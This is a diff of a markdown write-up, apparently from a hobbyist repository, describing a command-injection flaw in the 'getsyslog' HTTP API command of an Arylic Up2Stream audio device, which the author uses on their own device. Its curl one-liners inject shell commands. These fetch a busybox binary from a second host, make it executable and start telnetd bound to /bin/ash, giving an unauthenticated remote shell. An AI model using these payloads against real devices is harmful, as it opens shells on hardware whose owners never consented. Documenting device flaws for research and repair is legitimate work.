@@ -5,14 +5,15 @@ The command that has this vulnerability is **_"getsyslog"_**, see https://develo
 
 The following code snippets are using the IP address 10.1.1.58 for my Arylic Up2Stream device and 10.1.1.22 for a web server running on my local MacMini. 
 ```
-curl "http://10.1.1.58/httpapi.asp?command=getsyslog:ip:10.1.1.22/index.html;mkdir+/tmp/bin;wget+-O+/tmp/bin/busybox+-T+5+http://10.1.1.22/a31/bin/busybox+-q;chmod+777+/tmp/bin/busybox;/tmp/bin/busybox+telnetd+-l/bin/ash;"
+curl "http://10.1.1.58/httpapi.asp?command=getsyslog:ip:10.1.1.22/index.html;mkdir+/tmp/bin;wget+-O+/tmp/bin/busybox+-T+5+http://10.1.1.22/a31/bin/busybox+-q;chmod+555+/tmp/bin/busybox;ln+-s/tmp/bin/busybox+/tmp/bin/telnetd;/tmp/bin/telnetd+telnetd+-l/bin/ash;"
 ```
 The command above is executing the following commands on the device in addition to the "getsyslog" request:
 ```
 mkdir /tmp/bin
 wget -O /tmp/bin/busybox -T 5 http://10.1.1.22/a31/bin/busybox -q;
-chmod 777 /tmp/bin/busybox;
-/tmp/bin/busybox telnetd -l/bin/ash;
+chmod 555 /tmp/bin/busybox;
+ln -s /tmp/bin/busybox /tmp/bin/telnetd;
+/tmp/bin/telnetd telnetd -l/bin/ash;
 ```
 > **Note:**
 > Don't forget to add a ";" at the end inside the quotes. Replace all spaces with "+". 
@@ -20,9 +21,3 @@ chmod 777 /tmp/bin/busybox;
 The tool **_"busybox"_** is like a swiss army knife and combines a lot of CLI commands in a single binary file. That file was stripped down already in my version and does not include a telnetd anymore. Therefore you have to get a full version from somewhere. 
 
 A version of busybox is provided here, but there is an OpenWRT archive where you can get precompiled binaries for almost all utilities you may need. See section **_Hardware and Firmware_** for more information. On my web server (10.1.1.22) I've created subdirectory ***/a31/bin*** and have copied the busybox binary to that directory
-
-You may also redirect output and error output for telnetd: 
-```
-curl "http://10.1.1.58/httpapi.asp?command=getsyslog:ip:10.1.1.22/index.html;mkdir+/tmp/bin;wget+-O+/tmp/bin/busybox+-T+5+http://10.1.1.22/a31/bin/busybox+-q;chmod+777+/tmp/bin/busybox;/tmp/bin/busybox+telnetd+-l/bin/ash+>+/tmp/web/cmd.out+2>+/tmp/web/cmd.err;"
-```
-
